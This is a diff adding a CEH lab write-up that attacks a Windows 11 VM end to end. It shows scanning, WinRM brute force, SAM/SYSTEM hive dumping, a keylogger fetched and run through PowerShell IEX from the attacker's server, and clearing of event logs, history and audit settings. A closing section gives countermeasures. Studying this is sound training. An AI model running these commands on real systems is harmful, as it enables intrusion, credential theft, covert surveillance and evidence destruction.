@@ -1,0 +1,159 @@
+CEH v12: System Hacking Lab Project (Module 6)
+This project simulates a real-world system hacking scenario as outlined in CEH Module 6. It demonstrates how attackers move step-by-step from discovering a machine to fully compromising it, harvesting credentials, planting keyloggers, and finally covering their tracks   all within a controlled lab environment using ethical hacking tools.
+
+Project Summary Role	System	IP Address
+Attacker	Kali Linux	10.10.10.10
+Victim	Windows 11	10.10.10.20
+
+Objective: Gain full control over the Windows 11 target system and demonstrate all stages of the attack lifecycle: reconnaissance, credential attacks, privilege escalation, persistence, and cleanup.
+
+Tools Used: Nmap, Hydra, CrackMapExec, Evil-WinRM, PowerShell, Enum4Linux, winPEAS
+
+
+Phase 0: Setup Checklist
+
+Before starting the attack, verify that the target is alive and listening:
+Open ports: 135, 139, 445, 5985, 3389
+Windows firewall set to Private profile
+Services like RDP and WinRM must be running (netstat -an)
+Ping or run an initial Nmap scan to ensure basic reachability
+Why this matters: If the target isn't reachable or listening on the required ports, nothing else will work. This is like checking the doors and windows before trying to get inside.
+
+Phase 1: Reconnaissance & Host Discovery
+Finding Devices on the Network
+Command:
+netdiscover
+Output:
+IP              MAC Address          Vendor
+10.10.10.20     00:50:56:21:7D:5C    VMware, Inc.
+Explanation: This finds live hosts on the same local network. The MAC address tells us the target is likely running in a virtual machine  a strong hint that this is a lab or sandbox.
+
+Scanning Ports with Nmap
+Fast Scan:
+nmap -T5 10.10.10.20
+Output:
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
+Detailed Scan:
+nmap -sS -sV -p 135,139,445,3389,5985 10.10.10.20 -T5
+Output:
+PORT     STATE     SERVICE       VERSION
+135/tcp  filtered  msrpc
+139/tcp  filtered  netbios-ssn
+445/tcp  filtered  microsoft-ds
+3389/tcp open      ms-wbt-server
+5985/tcp open      http          Microsoft HTTPAPI httpd 2.0
+Explanation: RDP (3389) and WinRM (5985) are open that's a big opportunity. SMB ports (135/139/445) are filtered, so no luck attacking SMB here. The WinRM service runs over HTTP, not HTTPS, meaning it's not encrypted   another weak point.
+
+Gathering Info with Enum4Linux
+Command:
+enum4linux -a 10.10.10.20
+Info Found:
+NetBIOS name: WINDOWS11
+Workgroup: WORKGROUP
+Users: Administrator, Guest, krbtgt
+OS: Windows 11 (Build 22621)
+Explanation: Even without a password, we got a list of users and system info  very helpful for crafting attacks. It’s clear the machine is standalone (not in a domain), which simplifies things for us.
+
+Phase 2: Credential Attack & Remote Access
+Brute-Forcing WinRM Logins
+Command:
+crackmapexec winrm 10.10.10.20 -u fasttrack.txt -p rockyou.txt -t 1
+Result:
+WINRM 10.10.10.20 [+] WINDOWS11\Administrator:111 (Pwn3d!)
+Explanation: CrackMapExec tests username/password combos over WinRM. It found a hit: Administrator with password 111. That’s full system-level access. Passwords like this are why attackers love brute-force attacks.
+
+Gaining Remote Shell with Evil-WinRM
+Command:
+evil-winrm -i 10.10.10.20 -u Administrator -p 111
+Result:
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+Check Identity:
+whoami
+windows11\administrator
+Explanation: We now have full PowerShell access to the target   as Administrator. That’s game over from a control standpoint. We can now run commands, upload files, and explore the system freely.
+
+Phase 3: Privilege Escalation & Credential Harvesting
+Dumping SAM and SYSTEM Files
+Commands:
+reg save HKLM\SAM sam
+reg save HKLM\SYSTEM system
+move sam C:\Windows\Temp\sam
+move system C:\Windows\Temp\system
+Explanation: These files contain Windows password hashes. With admin rights, we can dump them and copy to a writable folder. Later, we can crack the hashes offline using tools like John the Ripper or Hashcat.
+
+Local Account Discovery
+Command:
+net user
+Result: Shows all local accounts, their groups, and if they require passwords.
+Explanation: Even though we already have admin access, it’s smart to check for other users, scheduled tasks, or hidden admin accounts. You can use winPEAS too for deeper checks.
+
+Phase 4: Keylogging Implementation
+Deploying a PowerShell Keylogger
+Download Logger:
+wget https://raw.githubusercontent.com/obscuritylabs/PowerShell-Keylogger/master/logger.ps1 -O keylogger.ps1
+Start Web Server:
+python3 -m http.server
+Run on Victim via WinRM:
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/keylogger.ps1')"
+Log File Location: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\log.txt
+Explanation: This keylogger records keystrokes system-wide using Windows APIs and saves them to a file. It's simple but effective. To persist across reboots, you'd need to install it via scheduled tasks or registry tweaks.
+
+Phase 5: Anti-Forensics (Hiding Evidence)
+Clearing Event Logs
+Clear All Logs:
+wevtutil el | ForEach-Object {wevtutil cl $_}
+Clear Specific Logs:
+wevtutil cl System
+wevtutil cl Security
+wevtutil cl "Windows PowerShell"
+Explanation: This deletes logs that could show when you logged in, what commands you ran, etc. Just be aware: clearing logs also leaves a trace (Event ID 1102), so smart defenders will notice if logs suddenly disappear.
+
+Clearing PowerShell History
+Commands:
+Clear-History
+Remove-Item (Get-PSReadlineOption).HistorySavePath
+Explanation: PowerShell saves history between sessions. These commands erase both the current session and saved command history   reducing forensic traces.
+
+Disabling Audit Logs
+Command:
+auditpol /set /category:* /success:disable /failure:disable
+Explanation: This stops Windows from recording most security events. It's like telling the system to look the other way while you do your thing. Again, the act of disabling might itself be logged.
+
+Clearing GUI and Execution Traces
+Commands:
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*'
+Clear-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Name '*'
+del C:\Windows\Prefetch\*.pf /Q
+Explanation: These commands clean out things like Run history, recent documents, and prefetch files (which show what was run). It's an effort to cover your tracks at every level.
+
+Phase 6: Credential Validation
+Testing Credentials with RDP
+Command:
+hydra -V -f -l administrator -p 111 rdp://10.10.10.20:3389
+Output:
+[rdp] host: 10.10.10.20 login: administrator password: 111
+Explanation: This confirms that the same weak credentials (admin:111) work for RDP too. That means we now have multiple ways to log in   and so would any attacker.
+
+Defensive Countermeasures
+To defend against everything shown in this lab, the following actions are strongly recommended:
+Network Security
+Use network segmentation to isolate critical systems
+Disable unnecessary services like WinRM and SMB
+Enforce secure versions (e.g., HTTPS instead of HTTP for WinRM)
+Credential & Access Management
+Enforce strong password policies and regular password changes
+Use multi-factor authentication (MFA) wherever possible
+Follow least privilege principles (users only get the access they need)
+Endpoint Protection
+Enable antivirus/EDR to detect and block keyloggers, registry access, and unusual scripts
+Use file integrity monitoring (FIM) to track registry and system file changes
+Monitoring & Detection
+Forward logs to a central SIEM (Security Information and Event Management) system
+Set up alerts for log clearing, audit policy changes, and unusual login times
+Use User Behavior Analytics (UBA/UEBA) to detect strange patterns
+
+Conclusion
+This lab demonstrates a full attack lifecycle   from scanning a target to gaining full control and hiding the tracks. It highlights how easily attackers can exploit weak passwords and unmonitored services. At the same time, it emphasizes why proper monitoring, strong credentials, and limited access are critical in real-world environments.
+This project helps reinforce the technical skills taught in CEH Module 6 and provides hands-on experience with real tools and tactics used by penetration testers and attackers alike.
